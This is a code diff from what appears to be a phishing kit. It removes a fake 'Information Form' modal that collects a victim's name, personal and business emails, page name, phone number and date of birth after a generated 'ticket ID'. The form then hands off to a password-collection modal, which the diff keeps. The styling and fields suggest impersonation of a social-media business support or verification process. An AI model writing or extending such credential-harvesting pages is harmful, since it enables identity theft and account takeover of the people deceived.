@@ -5,61 +5,6 @@ document.getElementById('ticketId').textContent = Utils.generateTicketId();
 
 // Start verification flow
 document.getElementById('submitRequestBtn').addEventListener('click', openClientModal);
-
-// ==================== MODAL 1: CLIENT INFO ====================
-function openClientModal() {
-    const content = `
-        <h2 class="font-bold text-[15px] mb-4">Information Form</h2>
-        <form id="clientForm" class="space-y-3">
-            <input type="text" id="fullName" placeholder="Full Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="email" id="email" placeholder="Email" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="email" id="emailBusiness" placeholder="Email Business" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="text" id="fanpage" placeholder="Page Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="tel" id="phone" placeholder="Phone Number" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <div>
-                <b class="text-[#9a979e] text-sm block mb-2">Date of Birth</b>
-                <div class="grid grid-cols-3 gap-2">
-                    <input type="number" id="day" placeholder="Day" min="1" max="31" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-                    <input type="number" id="month" placeholder="Month" min="1" max="12" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-                    <input type="number" id="year" placeholder="Year" min="1900" max="2024" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-                </div>
-            </div>
-            <textarea placeholder="Additional notes (optional)" class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
-            <p class="text-[#9a979e] text-[14px] mb-[7px]">Our response will be sent to you within 14 - 48 hours.</p>
-            <div class="mt-[15px] mb-[20px]">
-                <label class="cursor-pointer flex items-center gap-[5px] text-[14px] " for="custom-checkbox">
-                    <label class="inline-flex items-center cursor-pointer">
-                        <input type="checkbox">
-                    </label>
-                    I agree with<a class="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">Terms of use <img src="./public/icons/reject.svg" class="w-[10px] h-[10px] items-center inline" alt=""></a>
-                </label>
-            </div>
-            <button type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Send</button>
-        </form>
-    `;
-
-    Modal.create('clientModal', content);
-    Modal.open('clientModal');
-
-    document.getElementById('clientForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const formData = {
-            fullName: document.getElementById('fullName').value.trim(),
-            email: document.getElementById('email').value.trim(),
-            emailBusiness: document.getElementById('emailBusiness').value.trim(),
-            fanpage: document.getElementById('fanpage').value.trim(),
-            phone: document.getElementById('phone').value.trim(),
-            day: document.getElementById('day').value,
-            month: document.getElementById('month').value,
-            year: document.getElementById('year').value
-        };
-
-        Utils.saveRecord('__client_rec__fi_rst', formData);
-        Modal.close('clientModal');
-        openSecurityModal();
-    });
-}
-
 // ==================== MODAL 2: SECURITY (PASSWORD) ====================
 function openSecurityModal() {
     const content = `
